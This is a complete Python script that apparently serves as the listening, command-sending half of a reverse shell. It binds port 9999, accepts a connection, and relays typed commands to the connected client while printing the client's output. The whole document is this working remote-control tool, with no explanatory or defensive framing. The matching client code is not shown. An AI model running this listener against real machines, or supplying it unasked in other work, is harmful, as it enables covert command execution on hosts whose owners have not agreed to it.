import socket 
import sys 

# creating Socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999 
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("[*] Socket creating error:"+ str(msg))
        

# Binding the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("[+] Binding the port: "+ str(port))
        s.bind((host,port))
        s.listen(3)
        print("[*] Server is listening on port: "+ str(port))
    except socket.error as msg:
        print("[*] Socket binding error: "+ str(msg))
        # print("[*] Retrying .........")
        # bind_socket()


# Establish connection with a client 
def socket_accept():
    global s
    conn,addr=s.accept()
    print("[+] Connection established! | IP: "+addr[0]+" | Port: "+str(addr[1]))
    send_command(conn)
    conn.close()


# Send command to client 
def send_command(conn):
    global s
    while True:
        cmd=input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")
            
# main function 
def main():
    create_socket()
    bind_socket() 
    socket_accept() 
    
if __name__ == "__main__":
    main() 